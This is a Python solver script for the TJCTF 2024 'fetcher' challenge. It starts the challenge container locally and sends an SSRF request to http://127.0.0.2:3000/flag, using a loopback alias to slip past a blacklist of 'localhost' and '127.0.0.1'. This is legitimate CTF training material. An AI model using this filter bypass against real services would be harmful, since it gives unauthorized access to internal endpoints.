#!/usr/bin/env python3
"""Replay TJCTF 2024 fetcher as a local loopback-alias SSRF proof.

This helper is for local or explicitly authorized CTF challenge artifacts. It
builds and starts the provided Bun/Express service, then posts a URL with the
127.0.0.2 loopback alias to bypass the source blacklist for localhost and
127.0.0.1 while still reaching the service's local-only /flag route.
"""

from __future__ import annotations

import argparse
import re
import shutil
import socket
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path
from uuid import uuid4


FLAG_RE = re.compile(r"(?i)(?:tjctf|flag|ctf)\{[^{}\r\n]{3,300}\}")
PLACEHOLDER_MARKERS = ("TEST_FLAG", "FLAG_FOR_TESTING", "DUMMY", "PLACEHOLDER")


def build_ssrf_url() -> str:
    return "http://127.0.0.2:3000/flag"


def build_post_body() -> bytes:
    return urllib.parse.urlencode({"url": build_ssrf_url()}).encode()


def extract_flags(text: str) -> list[str]:
    flags: list[str] = []
    for match in FLAG_RE.finditer(text):
        candidate = match.group(0)
        if any(marker in candidate.upper() for marker in PLACEHOLDER_MARKERS):
            continue
        if candidate not in flags:
            flags.append(candidate)
    return flags


def free_local_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def solve_src_dir(
    src_dir: Path,
    image: str = "forgeflag-fetcher-replay",
    timeout: float = 60.0,
    build: bool = True,
) -> str:
    docker = shutil.which("docker")
    if not docker:
        raise RuntimeError("docker is required to replay the local fetcher service")
    app_js = src_dir / "app.js"
    flag_file = src_dir / "flag.txt"
    if not app_js.exists():
        raise FileNotFoundError(f"missing source app.js: {app_js}")
    if not flag_file.exists():
        raise FileNotFoundError(f"missing local flag file: {flag_file}")

    if build:
        subprocess.run(
            [docker, "build", "--platform", "linux/amd64", "-t", image, str(src_dir)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout,
            check=True,
        )

    name = f"forgeflag-fetcher-{uuid4().hex[:10]}"
    port = free_local_port()
    run_command = [
        docker,
        "run",
        "--rm",
        "--platform",
        "linux/amd64",
        "-d",
        "--name",
        name,
        "-p",
        f"127.0.0.1:{port}:3000",
        image,
    ]
    subprocess.run(run_command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout, check=True)
    try:
        transcript = post_until_ready(port, timeout=timeout)
    finally:
        subprocess.run([docker, "rm", "-f", name], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)

    flags = extract_flags(transcript)
    if not flags:
        raise RuntimeError(f"no non-placeholder flag found in transcript: {transcript[-400:]!r}")
    print("challenge: fetcher")
    print("artifact: source app.js")
    print(f"source_blacklist: localhost and 127.0.0.1 host substrings")
    print(f"ssrf_url: {build_ssrf_url()}")
    print("method: local loopback alias SSRF reaches the source-only /flag route")
    print(f"flag: {flags[0]}")
    return flags[0]


def post_until_ready(port: int, timeout: float) -> str:
    deadline = time.monotonic() + timeout
    url = f"http://127.0.0.1:{port}/fetch"
    last_error: Exception | None = None
    while time.monotonic() < deadline:
        try:
            request = urllib.request.Request(
                url,
                data=build_post_body(),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                method="POST",
            )
            with urllib.request.urlopen(request, timeout=2.0) as response:
                return response.read().decode("utf-8", errors="replace")
        except Exception as exc:
            last_error = exc
            time.sleep(0.5)
    raise TimeoutError(f"fetcher service did not return a transcript before timeout: {last_error}")


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay TJCTF fetcher from local CTF source artifacts.")
    parser.add_argument("--src-dir", type=Path, required=True, help="directory containing app.js, Dockerfile, and flag.txt")
    parser.add_argument("--image", default="forgeflag-fetcher-replay", help="local Docker image tag to build/run")
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument("--no-build", action="store_true", help="reuse an existing local image")
    args = parser.parse_args()
    try:
        solve_src_dir(args.src_dir.resolve(), image=args.image, timeout=args.timeout, build=not args.no_build)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
